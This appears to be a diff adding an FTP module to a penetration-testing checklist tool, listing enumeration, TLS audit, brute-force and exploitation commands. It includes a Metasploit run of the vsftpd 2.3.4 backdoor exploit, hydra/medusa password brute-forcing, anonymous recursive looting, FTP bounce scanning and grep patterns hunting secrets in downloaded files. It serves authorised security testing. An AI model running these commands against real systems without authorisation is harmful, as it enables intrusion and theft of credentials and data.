@@ -1,0 +1,213 @@
+module: ftp
+name: FTP (21 / 2121 / 990 / 20)
+inputs: [OUT, USERS, PASS]
+
+sections:
+
+  - id: initial
+    name: Initial Access & Detection
+    steps:
+      - id: version
+        text: Confirm live / version
+        commands: |
+          nmap -p21,2121,990,20 -sV $IP
+      - id: banner_plain
+        text: Banner grab (cleartext)
+        commands: |
+          nc -nv $IP $PORT
+          (sleep 3) | nc -nv $IP $PORT
+          curl -v ftp://$IP:$PORT/
+      - id: banner_tls
+        text: Banner grab (implicit TLS / 990)
+        tls_only: true
+        commands: |
+          openssl s_client -connect $IP:$PORT -quiet
+          curl -v --ftp-ssl --insecure ftps://$IP:$PORT/
+          lftp -e "set ssl:verify-certificate no; open ftps://$IP:$PORT; quit"
+      - id: tls_model
+        text: TLS model detection (explicit AUTH TLS)
+        commands: |
+          nmap -p$PORT --script=ftp-syst,banner $IP
+          openssl s_client -starttls ftp -connect $IP:$PORT
+
+  - id: fingerprint
+    name: Fingerprinting & Identification
+    steps:
+      - id: banner_syst
+        text: Daemon / OS + system type
+        commands: |
+          nmap -p$PORT -sV --script=banner,ftp-syst $IP
+      - id: manual_syst
+        text: Manual banner + SYST/STAT
+        commands: |
+          (printf 'SYST\r\nSTAT\r\nQUIT\r\n'; sleep 2) | nc -nv $IP $PORT | tee $OUT/ftp_banner.txt
+
+  - id: anon
+    name: Anonymous & Access Enumeration
+    steps:
+      - id: anon_login
+        text: Anonymous login check
+        commands: |
+          nmap -p$PORT --script=ftp-anon $IP
+          curl -v ftp://anonymous:anonymous@$IP:$PORT/
+      - id: listing
+        text: Directory listing / recursive
+        commands: |
+          lftp -e "set ftp:ssl-allow no; open -u anonymous,anonymous $IP:$PORT; ls -R; quit"
+          wget -r --no-parent ftp://anonymous:anonymous@$IP:$PORT/ -P $OUT/ftp_loot
+      - id: writable
+        text: Writable directory test (upload)
+        commands: |
+          echo test > /tmp/wtest.txt
+          curl -T /tmp/wtest.txt ftp://anonymous:anonymous@$IP:$PORT/
+          lftp -e "open -u anonymous,anonymous $IP:$PORT; put /tmp/wtest.txt; ls; quit"
+      - id: chroot
+        text: Chroot / scope check
+        manual: true
+        commands: |
+          # attempt CWD .. traversal to test jail boundary
+
+  - id: capability
+    name: Capability & Feature Enumeration
+    steps:
+      - id: feat
+        text: FEAT / HELP / SYST / STAT
+        commands: |
+          (printf 'FEAT\r\nHELP\r\nSYST\r\nSTAT\r\nQUIT\r\n'; sleep 2) | nc -nv $IP $PORT
+      - id: session_feat
+        text: Feature probing via session
+        manual: true
+        commands: |
+          lftp -e "open -u anonymous,anonymous $IP:$PORT; quote FEAT; quote SITE HELP; quit"
+      - id: site_cmds
+        text: SITE command probing
+        manual: true
+        commands: |
+          (printf 'USER anonymous\r\nPASS anonymous\r\nSITE HELP\r\nQUIT\r\n'; sleep 2) | nc -nv $IP $PORT
+
+  - id: tls
+    name: TLS / SSL (990 implicit + AUTH TLS)
+    tls_only: true
+    steps:
+      - id: tls_explicit
+        text: Explicit TLS audit (control port)
+        commands: |
+          testssl.sh --starttls ftp $IP:$PORT
+          sslscan --starttls-ftp $IP:$PORT
+          nmap -p$PORT --script=ssl-enum-ciphers --script-args tls.starttls=ftp $IP
+      - id: tls_implicit
+        text: Implicit TLS audit (990)
+        commands: |
+          testssl.sh $IP:$PORT
+          sslscan $IP:$PORT
+          nmap -p$PORT --script=ssl-enum-ciphers $IP
+      - id: cert_san
+        text: Certificate details / SAN harvest
+        commands: |
+          openssl s_client -starttls ftp -connect $IP:$PORT </dev/null 2>/dev/null | openssl x509 -noout -text
+          echo | openssl s_client -connect $IP:$PORT 2>/dev/null | openssl x509 -noout -ext subjectAltName
+      - id: tls_vulns
+        text: Known TLS vulnerabilities
+        commands: |
+          nmap -p$PORT --script=ssl-heartbleed,ssl-poodle,ssl-ccs-injection $IP
+
+  - id: auth
+    name: Authentication Surface Mapping
+    steps:
+      - id: auth_model
+        text: Auth model / prompts
+        manual: true
+        commands: |
+          ftp $IP $PORT
+      - id: user_enum
+        text: Username enumeration (USER response / timing)
+        manual: true
+        commands: |
+          (printf 'USER root\r\nQUIT\r\n'; sleep 1) | nc -nv $IP $PORT
+
+  - id: vuln
+    name: Vulnerability Identification (fingerprint-driven)
+    steps:
+      - id: cve_map
+        text: Version to CVE mapping
+        commands: |
+          searchsploit <daemon> <version>
+          searchsploit vsftpd
+          searchsploit proftpd
+      - id: script_vuln
+        text: Script-based vuln checks
+        commands: |
+          nmap -p$PORT --script=ftp-vsftpd-backdoor,ftp-proftpd-backdoor,ftp-bounce,vuln $IP
+      - id: vsftpd_backdoor
+        text: vsftpd 2.3.4 backdoor
+        commands: |
+          msfconsole -qx "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS $IP; set RPORT $PORT; run; exit"
+      - id: proftpd_modcopy
+        text: ProFTPD mod_copy (CVE-2015-3306)
+        commands: |
+          msfconsole -qx "use exploit/unix/ftp/proftpd_modcopy_exec; info; exit"
+          searchsploit proftpd mod_copy
+      - id: ftp_bounce
+        text: FTP bounce (scan via FTP server)
+        commands: |
+          nmap -b anonymous:anonymous@$IP -p1-1000 <internal_target>
+      - id: anon_rce
+        text: Anonymous-write to RCE path
+        manual: true
+        commands: |
+          # upload to web-served / executed dir found in anonymous enumeration
+
+  - id: creds
+    name: Default & Weak Credentials
+    authorized: true
+    steps:
+      - id: brute_plain
+        text: Brute-force (cleartext)
+        commands: |
+          hydra -L $USERLIST -P $PASSLIST ftp://$IP:$PORT
+          medusa -h $IP -U $USERLIST -P $PASSLIST -M ftp -n $PORT
+          ncrack -p$PORT --user $USER -P $PASSLIST ftp://$IP
+          nmap -p$PORT --script=ftp-brute --script-args userdb=$USERLIST,passdb=$PASSLIST $IP
+      - id: brute_msf
+        text: Brute-force via Metasploit
+        commands: |
+          msfconsole -qx "use auxiliary/scanner/ftp/ftp_login; set RHOSTS $IP; set RPORT $PORT; set USER_FILE $USERLIST; set PASS_FILE $PASSLIST; run; exit"
+      - id: brute_tls
+        text: Brute-force (implicit TLS / 990)
+        tls_only: true
+        commands: |
+          hydra -L $USERLIST -P $PASSLIST ftps://$IP:$PORT
+
+  - id: disclosure
+    name: Information Disclosure & Data Harvesting
+    steps:
+      - id: full_pull
+        text: Full recursive pull
+        commands: |
+          wget -r --no-parent ftp://<user>:<pass>@$IP:$PORT/ -P $OUT/ftp_loot
+          lftp -e "open -u <user>,<pass> $IP:$PORT; mirror -c / $OUT/ftp_loot; quit"
+      - id: predisclosure
+        text: Capture pre-auth banner
+        commands: |
+          (sleep 3) | nc -nv $IP $PORT | tee $OUT/ftp_predisclosure.txt
+      - id: secret_scan
+        text: Sensitive-file / secret scan on loot
+        commands: |
+          grep -RiaE 'pass|pwd|secret|key|token|BEGIN .*PRIVATE KEY|user' $OUT/ftp_loot
+          trufflehog filesystem $OUT/ftp_loot
+
+  - id: exploit
+    name: Exploitation
+    authorized: true
+    steps:
+      - id: anon
+        text: "Anonymous access + loot"
+        commands: |
+          ftp -inv $IP    # login anonymous / anonymous
+          wget -r ftp://anonymous:anonymous@$IP/
+      - id: brute
+        text: "Brute force & known backdoors"
+        commands: |
+          hydra -L $USERLIST -P $PASSLIST ftp://$IP
+          # vsftpd 2.3.4 backdoor  |  ProFTPD mod_copy CVE-2015-3306
+          searchsploit <product> <version>
